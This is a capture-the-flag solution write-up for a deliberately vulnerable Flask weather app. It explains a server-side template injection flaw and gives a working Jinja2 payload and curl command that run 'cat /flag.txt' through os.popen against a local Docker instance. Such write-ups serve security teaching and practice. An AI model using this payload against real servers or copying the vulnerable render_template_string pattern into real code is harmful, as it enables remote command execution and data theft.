# Cyberpunk Weather App CTF - Solution

## 1. Vulnerability Identification

The application is a Python Flask web server using the Jinja2 templating engine. The vulnerability lies in the main route (`/`) within `app/app.py`.

When a POST request is made to `/` with a `district` parameter, the application uses `render_template_string` with an f-string that directly includes the user-supplied `district` value:

```python
# ...
    if request.method == 'POST':
        district = request.form.get('district')

        if district in districts:
            # ...
            message = render_template_string(f"Current weather in {district} (on {data['time']}): {data['temperature']}°C, {data['conditions']}")
        else:
            # Vulnerable line:
            message = render_template_string(f"District {district} not found.")

    return render_template('index.html', districts=districts, message=message)
# ...
```

If the provided `district` is not in the predefined `districts` list, the `else` block is executed. The `district` parameter is directly embedded into the string passed to `render_template_string`. This allows for Server-Side Template Injection (SSTI).

The `Dockerfile` shows that `flag.txt` is copied to `/flag.txt` within the container.

## 2. Exploitation

To exploit this SSTI vulnerability and read `/flag.txt`, we can send a POST request with a crafted `district` parameter containing a Jinja2 payload.

The payload uses the Jinja2 context to access Python's built-in functions and execute arbitrary commands. Specifically, it imports the `os` module and uses `popen` to execute `cat /flag.txt` and read its output.

Payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

We need to send this payload as the value for the `district` form parameter in a POST request. The application is expected to be running on port 5001 (from `docker-compose.yml`).

## 3. Steps to Reproduce

1.  **Run the application** (if not already running):

    ```bash
    cd cyberpunk_weather_app
    docker-compose up -d
    ```

2.  **Send the malicious POST request using `curl`**:

    Open a terminal and execute the following command. This command sends a POST request to `http://localhost:5001/` with the `district` parameter set to our payload. Make sure the application is running and accessible at this address.

    ```bash
    curl -X POST -d "district={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}" http://localhost:5001/
    ```

3.  **Observe the output**:
    The response from the server will contain the rendered template, which will include the content of `/flag.txt`. The flag will likely be embedded within the "District ... not found." message.

    Example (the exact output might vary slightly in formatting):

    ```html
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <title>Cyberpunk Weather</title>
        <link rel="stylesheet" href="/static/style.css" />
      </head>
      <body>
        <div class="container">
          <h1>Cyberpunk Weather Forecast</h1>
          <form method="POST" action="/">
            <select name="district">
              <option value="Night City Center">Night City Center</option>
              <!-- ... other districts ... -->
            </select>
            <button type="submit">Get Weather</button>
          </form>
          <div class="message">District your_flag_here not found.</div>
        </div>
      </body>
    </html>
    ```

    The flag will be where `your_flag_here` is indicated in the example above, replacing the malicious payload in the "District ... not found" message.

## 4. Cleanup (Optional)

    ```bash
    cd cyberpunk_weather_app
    docker-compose down
    ```
